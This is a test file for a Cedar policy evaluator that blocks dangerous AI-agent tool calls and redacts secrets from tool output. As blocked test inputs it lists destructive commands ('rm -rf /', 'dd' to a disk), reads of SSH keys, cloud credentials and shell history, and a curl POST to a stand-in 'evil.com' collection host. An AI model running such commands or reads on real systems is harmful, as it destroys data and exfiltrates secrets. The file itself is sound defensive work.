/**
 * Tests for Sondera Cedar Policy Evaluator
 *
 * Tests each policy in policy-sondera-base.cedar with safe dummy data.
 * No actual files are created/modified - we test the policy logic directly.
 */

import fs from "fs";
import path from "path";
import { describe, it, expect, beforeAll } from "vitest";
import { CedarEvaluator } from "./evaluator.js";

// Load the default policy pack
const policyPath = path.resolve(import.meta.dirname, "policy-sondera-base.cedar");
const policyText = fs.readFileSync(policyPath, "utf-8");

// Add the default allow policy (as the extension does in standard mode)
const allowAllPolicy = `
@id("default-allow")
permit(principal, action, resource);
`;
const fullPolicy = allowAllPolicy + "\n\n" + policyText;

let evaluator: CedarEvaluator;

beforeAll(() => {
  evaluator = new CedarEvaluator(fullPolicy);
});

// Helper to test PRE_TOOL blocking
function expectBlocked(
  toolName: string,
  params: Record<string, unknown>,
  expectedPolicyId?: string,
) {
  const result = evaluator.evaluatePreTool(toolName, params);
  expect(result.decision).toBe("DENY");
  if (expectedPolicyId) {
    expect(result.policyIds).toContain(expectedPolicyId);
  }
}

// Helper to test PRE_TOOL allowing
function expectAllowed(toolName: string, params: Record<string, unknown>) {
  const result = evaluator.evaluatePreTool(toolName, params);
  expect(result.decision).toBe("ALLOW");
}

// Helper to test POST_TOOL redaction
function expectRedacted(toolName: string, response: string, expectedPolicyId?: string) {
  const result = evaluator.evaluatePostTool(toolName, response);
  expect(result.decision).toBe("DENY");
  if (expectedPolicyId) {
    expect(result.policyIds).toContain(expectedPolicyId);
  }
}

// Helper to test POST_TOOL pass-through
function expectNotRedacted(toolName: string, response: string) {
  const result = evaluator.evaluatePostTool(toolName, response);
  expect(result.decision).toBe("ALLOW");
}

// ============================================
// DANGEROUS COMMAND RESTRICTIONS
// ============================================

describe("Dangerous Command Restrictions", () => {
  describe("sondera-block-rm", () => {
    it("blocks rm commands", () => {
      expectBlocked("exec", { command: "rm file.txt" }, "sondera-block-rm");
      expectBlocked("exec", { command: "rm -r directory" }, "sondera-block-rm");
    });

    it("allows commands without rm", () => {
      expectAllowed("exec", { command: "ls -la" });
      expectAllowed("exec", { command: "echo hello" });
    });
  });

  describe("sondera-block-rf-flags", () => {
    it("blocks -rf flags", () => {
      expectBlocked("exec", { command: "rm -rf /" }, "sondera-block-rf-flags");
      expectBlocked("exec", { command: "something -rf path" }, "sondera-block-rf-flags");
    });

    it("allows -r and -f separately", () => {
      expectAllowed("exec", { command: "grep -r pattern" });
      expectAllowed("exec", { command: "tar -f archive.tar" });
    });
  });

  describe("sondera-block-sudo", () => {
    it("blocks sudo commands", () => {
      expectBlocked("exec", { command: "sudo apt install" }, "sondera-block-sudo");
      expectBlocked("exec", { command: "sudo rm file" }, "sondera-block-sudo");
    });

    it("allows commands without sudo", () => {
      expectAllowed("exec", { command: "apt list --installed" });
    });
  });

  describe("sondera-block-su", () => {
    it("blocks su commands", () => {
      expectBlocked("exec", { command: "su root" }, "sondera-block-su");
      expectBlocked("exec", { command: "su - username" }, "sondera-block-su");
    });

    it("allows commands containing 'su' as substring", () => {
      expectAllowed("exec", { command: "echo sum" });
      expectAllowed("exec", { command: "result=success" });
    });
  });

  describe("sondera-block-chmod-777", () => {
    it("blocks chmod 777", () => {
      expectBlocked("exec", { command: "chmod 777 file" }, "sondera-block-chmod-777");
      expectBlocked("exec", { command: "chmod 777 /path/to/dir" }, "sondera-block-chmod-777");
    });

    it("allows other chmod commands", () => {
      expectAllowed("exec", { command: "chmod 755 file" });
      expectAllowed("exec", { command: "chmod +x script.sh" });
    });
  });

  describe("sondera-block-disk-operations", () => {
    it("blocks mkfs", () => {
      expectBlocked("exec", { command: "mkfs.ext4 /dev/sda1" }, "sondera-block-disk-operations");
    });

    it("blocks dd if=", () => {
      expectBlocked(
        "exec",
        { command: "dd if=/dev/zero of=/dev/sda" },
        "sondera-block-disk-operations",
      );
    });

    it("blocks writes to /dev/sd*", () => {
      expectBlocked("exec", { command: "echo test >/dev/sda" }, "sondera-block-disk-operations");
    });

    it("blocks writes to /dev/nvme*", () => {
      expectBlocked("exec", { command: "cat file >/dev/nvme0n1" }, "sondera-block-disk-operations");
    });

    it("blocks all dd if= commands (even safe ones)", () => {
      // The policy blocks ALL dd if= commands for safety
      expectBlocked(
        "exec",
        { command: "dd if=input.img of=output.img" },
        "sondera-block-disk-operations",
      );
    });

    it("allows dd without if=", () => {
      expectAllowed("exec", { command: "dd --help" });
    });
  });

  describe("sondera-block-kill-system", () => {
    it("blocks kill -9 1 (init)", () => {
      expectBlocked("exec", { command: "kill -9 1" }, "sondera-block-kill-system");
    });

    it("blocks pkill -9 init", () => {
      expectBlocked("exec", { command: "pkill -9 init" }, "sondera-block-kill-system");
    });

    it("blocks killall", () => {
      expectBlocked("exec", { command: "killall process" }, "sondera-block-kill-system");
    });

    it("allows regular kill commands", () => {
      // Note: kill -9 1XXXX would match *kill -9 1* pattern
      expectAllowed("exec", { command: "kill -9 2345" });
      expectAllowed("exec", { command: "kill 12345" });
      expectAllowed("exec", { command: "pkill node" });
    });
  });

  describe("sondera-block-shutdown", () => {
    it("blocks shutdown", () => {
      expectBlocked("exec", { command: "shutdown -h now" }, "sondera-block-shutdown");
    });

    it("blocks reboot", () => {
      expectBlocked("exec", { command: "reboot" }, "sondera-block-shutdown");
    });

    it("blocks poweroff", () => {
      expectBlocked("exec", { command: "poweroff" }, "sondera-block-shutdown");
    });

    it("blocks init 0", () => {
      expectBlocked("exec", { command: "init 0" }, "sondera-block-shutdown");
    });
  });
});

// ============================================
// SENSITIVE FILE RESTRICTIONS
// ============================================

describe("Sensitive File Restrictions", () => {
  describe("sondera-block-read-ssh-keys", () => {
    it("blocks reading SSH private keys", () => {
      expectBlocked("read", { path: "/home/user/.ssh/id_rsa" }, "sondera-block-read-ssh-keys");
      expectBlocked("read", { path: "/home/user/.ssh/id_ed25519" }, "sondera-block-read-ssh-keys");
    });

    it("blocks reading authorized_keys", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.ssh/authorized_keys" },
        "sondera-block-read-ssh-keys",
      );
    });

    it("blocks reading .pem files", () => {
      expectBlocked("read", { path: "/path/to/key.pem" }, "sondera-block-read-ssh-keys");
    });

    it("allows reading other files", () => {
      expectAllowed("read", { path: "/home/user/.ssh/config" });
      expectAllowed("read", { path: "/home/user/document.txt" });
    });
  });

  describe("sondera-block-read-credentials", () => {
    it("blocks reading credentials files", () => {
      expectBlocked("read", { path: "/app/credentials.json" }, "sondera-block-read-credentials");
    });

    it("blocks reading secrets files", () => {
      expectBlocked("read", { path: "/app/secrets.yaml" }, "sondera-block-read-credentials");
    });

    it("blocks reading .env files", () => {
      expectBlocked("read", { path: "/project/.env" }, "sondera-block-read-credentials");
      expectBlocked("read", { path: "/project/.env.local" }, "sondera-block-read-credentials");
    });

    it("allows reading regular config files", () => {
      expectAllowed("read", { path: "/app/config.json" });
    });
  });

  describe("sondera-block-read-cloud-creds", () => {
    it("blocks reading AWS credentials", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.aws/credentials" },
        "sondera-block-read-cloud-creds",
      );
      expectBlocked("read", { path: "/home/user/.aws/config" }, "sondera-block-read-cloud-creds");
    });

    it("blocks reading GCloud credentials", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.gcloud/credentials.json" },
        "sondera-block-read-cloud-creds",
      );
    });

    it("blocks reading Azure credentials", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.azure/credentials" },
        "sondera-block-read-cloud-creds",
      );
    });

    it("blocks reading kube config", () => {
      expectBlocked("read", { path: "/home/user/.kube/config" }, "sondera-block-read-cloud-creds");
    });
  });

  describe("sondera-block-write-ssh", () => {
    it("blocks writing to .ssh directory", () => {
      expectBlocked("write", { path: "/home/user/.ssh/id_rsa" }, "sondera-block-write-ssh");
      expectBlocked(
        "write",
        { path: "/home/user/.ssh/authorized_keys" },
        "sondera-block-write-ssh",
      );
      expectBlocked("write", { path: "/home/user/.ssh/config" }, "sondera-block-write-ssh");
    });

    it("allows writing to other directories", () => {
      expectAllowed("write", { path: "/home/user/documents/file.txt" });
    });
  });

  describe("sondera-block-write-env", () => {
    it("blocks writing .env files", () => {
      expectBlocked("write", { path: "/project/.env" }, "sondera-block-write-env");
      expectBlocked("write", { path: "/project/.env.production" }, "sondera-block-write-env");
    });

    it("allows writing other files", () => {
      expectAllowed("write", { path: "/project/config.js" });
    });
  });

  describe("sondera-block-write-git-internals", () => {
    it("blocks writing to .git directory", () => {
      expectBlocked("write", { path: "/project/.git/config" }, "sondera-block-write-git-internals");
      expectBlocked(
        "write",
        { path: "/project/.git/hooks/pre-commit" },
        "sondera-block-write-git-internals",
      );
    });

    it("allows writing to project files", () => {
      expectAllowed("write", { path: "/project/src/index.ts" });
    });
  });

  describe("sondera-block-edit-sensitive", () => {
    it("blocks editing .ssh files", () => {
      expectBlocked("edit", { path: "/home/user/.ssh/config" }, "sondera-block-edit-sensitive");
    });

    it("blocks editing .env files", () => {
      expectBlocked("edit", { path: "/project/.env" }, "sondera-block-edit-sensitive");
    });

    it("blocks editing .pem files", () => {
      expectBlocked("edit", { path: "/path/to/cert.pem" }, "sondera-block-edit-sensitive");
    });

    it("blocks editing credentials files", () => {
      expectBlocked("edit", { path: "/app/credentials.json" }, "sondera-block-edit-sensitive");
    });

    it("allows editing other files", () => {
      expectAllowed("edit", { path: "/project/src/index.ts" });
    });
  });
});

// ============================================
// SYSTEM DIRECTORY RESTRICTIONS
// ============================================

describe("System Directory Restrictions", () => {
  describe("sondera-block-write-system-dirs", () => {
    it("blocks writing to /etc", () => {
      expectBlocked("write", { path: "/etc/passwd" }, "sondera-block-write-system-dirs");
      expectBlocked("write", { path: "/etc/hosts" }, "sondera-block-write-system-dirs");
    });

    it("blocks writing to /usr", () => {
      expectBlocked("write", { path: "/usr/bin/program" }, "sondera-block-write-system-dirs");
    });

    it("blocks writing to /bin", () => {
      expectBlocked("write", { path: "/bin/bash" }, "sondera-block-write-system-dirs");
    });

    it("blocks writing to /sbin", () => {
      expectBlocked("write", { path: "/sbin/init" }, "sondera-block-write-system-dirs");
    });

    it("blocks writing to /boot", () => {
      expectBlocked("write", { path: "/boot/vmlinuz" }, "sondera-block-write-system-dirs");
    });

    it("blocks writing to /sys", () => {
      expectBlocked(
        "write",
        { path: "/sys/kernel/mm/transparent_hugepage/enabled" },
        "sondera-block-write-system-dirs",
      );
    });

    it("blocks writing to /proc", () => {
      expectBlocked(
        "write",
        { path: "/proc/sys/net/ipv4/ip_forward" },
        "sondera-block-write-system-dirs",
      );
    });

    it("allows writing to user directories", () => {
      expectAllowed("write", { path: "/home/user/file.txt" });
      expectAllowed("write", { path: "/tmp/tempfile" });
    });
  });

  describe("sondera-block-glob-sensitive", () => {
    it("blocks globbing .ssh directory", () => {
      expectBlocked("glob", { pattern: "/home/user/.ssh/*" }, "sondera-block-glob-sensitive");
      expectBlocked("glob", { pattern: "**/.ssh/**" }, "sondera-block-glob-sensitive");
    });

    it("blocks globbing .aws directory", () => {
      expectBlocked("glob", { pattern: "/home/user/.aws/*" }, "sondera-block-glob-sensitive");
    });

    it("blocks globbing .gnupg directory", () => {
      expectBlocked("glob", { pattern: "/home/user/.gnupg/*" }, "sondera-block-glob-sensitive");
    });

    it("allows globbing other directories", () => {
      expectAllowed("glob", { pattern: "/project/src/**/*.ts" });
    });
  });
});

// ============================================
// SHELL HISTORY PROTECTION
// ============================================

describe("Shell History Protection", () => {
  describe("sondera-block-read-shell-history", () => {
    it("blocks reading bash history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.bash_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("blocks reading zsh history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.zsh_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("blocks reading node REPL history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.node_repl_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("blocks reading Python history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.python_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("blocks reading psql history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.psql_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("blocks reading MySQL history", () => {
      expectBlocked(
        "read",
        { path: "/home/user/.mysql_history" },
        "sondera-block-read-shell-history",
      );
    });

    it("allows reading other files", () => {
      expectAllowed("read", { path: "/home/user/.bashrc" });
      expectAllowed("read", { path: "/home/user/.zshrc" });
    });
  });
});

// ============================================
// NETWORK RESTRICTIONS
// ============================================

describe("Network Restrictions", () => {
  describe("sondera-block-paste-sites", () => {
    it("blocks pastebin.com", () => {
      expectBlocked(
        "exec",
        { command: "curl https://pastebin.com/raw/abc123" },
        "sondera-block-paste-sites",
      );
    });

    it("blocks paste.ee", () => {
      expectBlocked(
        "exec",
        { command: "wget https://paste.ee/p/abc123" },
        "sondera-block-paste-sites",
      );
    });

    it("blocks hastebin", () => {
      expectBlocked(
        "exec",
        { command: "curl https://hastebin.com/raw/abc" },
        "sondera-block-paste-sites",
      );
    });

    it("blocks 0x0.st", () => {
      expectBlocked("exec", { command: "curl https://0x0.st/abc" }, "sondera-block-paste-sites");
    });

    it("allows other URLs", () => {
      expectAllowed("exec", { command: "curl https://api.github.com/repos" });
    });
  });

  describe("sondera-block-curl-post-external", () => {
    it("blocks curl POST to external hosts", () => {
      expectBlocked(
        "exec",
        { command: "curl -X POST https://evil.com/collect" },
        "sondera-block-curl-post-external",
      );
    });

    it("allows curl POST to localhost", () => {
      expectAllowed("exec", { command: "curl -X POST http://localhost:3000/api" });
    });

    it("allows curl POST to 127.0.0.1", () => {
      expectAllowed("exec", { command: "curl -X POST http://127.0.0.1:8080/endpoint" });
    });

    it("allows curl GET to external hosts", () => {
      expectAllowed("exec", { command: "curl https://api.example.com/data" });
    });
  });
});

// ============================================
// OUTPUT REDACTION (POST_TOOL)
// ============================================

describe("Output Redaction (POST_TOOL)", () => {
  describe("sondera-redact-api-keys", () => {
    it("redacts API_KEY", () => {
      expectRedacted("read", "config:\n  API_KEY=sk-abc123xyz", "sondera-redact-api-keys");
    });

    it("redacts APIKEY", () => {
      expectRedacted("read", "APIKEY=secret123", "sondera-redact-api-keys");
    });

    it("redacts api_key=", () => {
      // Policy looks for api_key= (with equals sign)
      expectRedacted("read", "api_key=secret123", "sondera-redact-api-keys");
    });

    it("redacts apikey", () => {
      expectRedacted("read", "apikey=test123", "sondera-redact-api-keys");
    });

    it("allows output without API keys", () => {
      expectNotRedacted("read", "Hello world\nNo secrets here");
    });
  });

  describe("sondera-redact-secrets", () => {
    it("redacts SECRET=", () => {
      expectRedacted("read", "SECRET=mysecretvalue", "sondera-redact-secrets");
    });

    it("redacts SECRET_KEY=", () => {
      expectRedacted("read", "SECRET_KEY=abc123", "sondera-redact-secrets");
    });

    it("redacts PASSWORD=", () => {
      expectRedacted("read", "DATABASE_PASSWORD=hunter2", "sondera-redact-secrets");
    });

    it("redacts PRIVATE_KEY=", () => {
      expectRedacted("read", "PRIVATE_KEY=-----BEGIN RSA", "sondera-redact-secrets");
    });

    it("allows normal output", () => {
      expectNotRedacted("read", "Build completed successfully");
    });
  });

  describe("sondera-redact-aws-creds", () => {
    it("redacts AWS_ACCESS_KEY", () => {
      expectRedacted("read", "AWS_ACCESS_KEY_ID=AKIA...", "sondera-redact-aws-creds");
    });

    it("redacts AWS_SECRET", () => {
      expectRedacted("read", "AWS_SECRET_ACCESS_KEY=secret", "sondera-redact-aws-creds");
    });

    it("redacts AKIA patterns", () => {
      expectRedacted("read", "Access key: AKIAIOSFODNN7EXAMPLE", "sondera-redact-aws-creds");
    });

    it("allows non-AWS output", () => {
      expectNotRedacted("read", "Deployment complete to us-east-1");
    });
  });

  describe("sondera-redact-anthropic-keys", () => {
    it("redacts sk-ant-* patterns", () => {
      expectRedacted("read", "key: sk-ant-api03-abcdefg123456", "sondera-redact-anthropic-keys");
    });

    it("redacts ANTHROPIC_API_KEY", () => {
      expectRedacted("read", "ANTHROPIC_API_KEY=sk-ant-xxx", "sondera-redact-anthropic-keys");
    });

    it("allows non-Anthropic output", () => {
      expectNotRedacted("read", "Using Claude model");
    });
  });

  describe("sondera-redact-openai-keys", () => {
    it("redacts sk-proj-* patterns", () => {
      expectRedacted("read", "key: sk-proj-abcdefg123456", "sondera-redact-openai-keys");
    });

    it("redacts OPENAI_API_KEY", () => {
      expectRedacted("read", "OPENAI_API_KEY=sk-proj-xxx", "sondera-redact-openai-keys");
    });
  });

  describe("sondera-redact-stripe-keys", () => {
    it("redacts sk_live_* patterns", () => {
      expectRedacted("read", "stripe_key: sk_live_abcdefg123456", "sondera-redact-stripe-keys");
    });

    it("redacts sk_test_* patterns", () => {
      expectRedacted("read", "stripe_key: sk_test_abcdefg123456", "sondera-redact-stripe-keys");
    });

    it("redacts pk_live_* patterns", () => {
      expectRedacted("read", "publishable: pk_live_abcdefg123456", "sondera-redact-stripe-keys");
    });
  });

  describe("sondera-redact-google-keys", () => {
    it("redacts AIza* patterns", () => {
      expectRedacted(
        "read",
        "google_api_key: AIzaSyABCDEFGHIJKLMNOP",
        "sondera-redact-google-keys",
      );
    });

    it("redacts GOOGLE_API_KEY", () => {
      expectRedacted("read", "GOOGLE_API_KEY=AIza123", "sondera-redact-google-keys");
    });
  });

  describe("sondera-redact-huggingface-tokens", () => {
    it("redacts hf_* patterns", () => {
      expectRedacted("read", "token: hf_abcdefghijklmnop", "sondera-redact-huggingface-tokens");
    });

    it("redacts HF_TOKEN", () => {
      expectRedacted("read", "HF_TOKEN=hf_xxx", "sondera-redact-huggingface-tokens");
    });

    it("redacts HUGGINGFACE_* patterns", () => {
      expectRedacted("read", "HUGGINGFACE_API_KEY=xxx", "sondera-redact-huggingface-tokens");
    });
  });
});

// ============================================
// EDGE CASES
// ============================================

describe("Edge Cases", () => {
  it("handles empty params gracefully", () => {
    const result = evaluator.evaluatePreTool("exec", {});
    expect(result.decision).toBe("ALLOW");
  });

  it("handles missing command param", () => {
    const result = evaluator.evaluatePreTool("exec", { other: "value" });
    expect(result.decision).toBe("ALLOW");
  });

  it("handles unknown tool names", () => {
    const result = evaluator.evaluatePreTool("unknown_tool", { foo: "bar" });
    expect(result.decision).toBe("ALLOW");
  });

  it("handles empty response in POST_TOOL", () => {
    const result = evaluator.evaluatePostTool("read", "");
    expect(result.decision).toBe("ALLOW");
  });
});
